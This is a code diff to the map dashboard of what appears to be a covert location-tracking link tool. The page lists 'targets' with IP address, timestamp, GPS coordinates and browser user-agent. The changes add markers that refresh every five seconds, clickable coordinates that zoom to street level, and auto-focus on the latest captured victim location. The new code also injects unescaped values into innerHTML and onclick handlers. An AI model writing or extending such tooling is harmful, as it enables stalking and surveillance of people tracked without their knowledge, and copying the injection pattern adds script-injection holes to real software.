@@ -158,12 +158,26 @@
 // Initialize map
 var map = L.map('map').setView([30, 70], 5);
 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+var markerLayer = L.layerGroup().addTo(map);
 
 // Add existing markers
 {% for location in data %}
-    L.marker([{{location[1]}}, {{location[2]}}]).addTo(map)
+    L.marker([{{location[1]}}, {{location[2]}}]).addTo(markerLayer)
       .bindPopup("{{location[0]}} - {{location[5]}}");
 {% endfor %}
+
+function focusOnLocation(lat, lon, label) {
+    map.setView([lat, lon], 15);
+    L.popup()
+      .setLatLng([lat, lon])
+      .setContent(label || (lat + ', ' + lon))
+      .openOn(map);
+}
+
+// Focus latest coordinate by default on page load.
+{% if data|length > 0 %}
+focusOnLocation({{data[0][1]}}, {{data[0][2]}}, "Latest location: {{data[0][0]}}");
+{% endif %}
 
 // Link functions
 function copyLink() {
@@ -183,7 +197,7 @@ setInterval(function(){
         // Update target list
         var targetHtml = '';
         data.locations.forEach(loc => {
-            targetHtml += '<div class="target-item"><strong>ID:</strong> ' + loc[0] + '<br><strong>IP:</strong> ' + loc[3] + '<br><strong>Time:</strong> ' + loc[5] + '<br><strong>Coords:</strong> ' + loc[1] + ', ' + loc[2] + '</div>';
+            targetHtml += '<div class="target-item"><strong>ID:</strong> ' + loc[0] + '<br><strong>IP:</strong> ' + loc[3] + '<br><strong>Time:</strong> ' + loc[5] + '<br><strong>Coords:</strong> <a href="#" onclick="focusOnLocation(' + loc[1] + ',' + loc[2] + ', \'Target: ' + loc[0] + '\'); return false;">' + loc[1] + ', ' + loc[2] + '</a></div>';
         });
         document.getElementById('targetList').innerHTML = targetHtml;
         
@@ -193,6 +207,18 @@ setInterval(function(){
             agentHtml += '<div class="target-item"><strong>' + loc[0] + '</strong><br><small>' + loc[4].substring(0, 80) + '...</small></div>';
         });
         document.getElementById('agentList').innerHTML = agentHtml;
+
+        // Rebuild markers from latest API data.
+        markerLayer.clearLayers();
+        data.locations.forEach(loc => {
+            L.marker([loc[1], loc[2]]).addTo(markerLayer)
+              .bindPopup(loc[0] + ' - ' + loc[5]);
+        });
+
+        // Keep latest coordinate as default center.
+        if (data.locations.length > 0) {
+            focusOnLocation(data.locations[0][1], data.locations[0][2], 'Latest location: ' + data.locations[0][0]);
+        }
     });
 }, 5000);
 
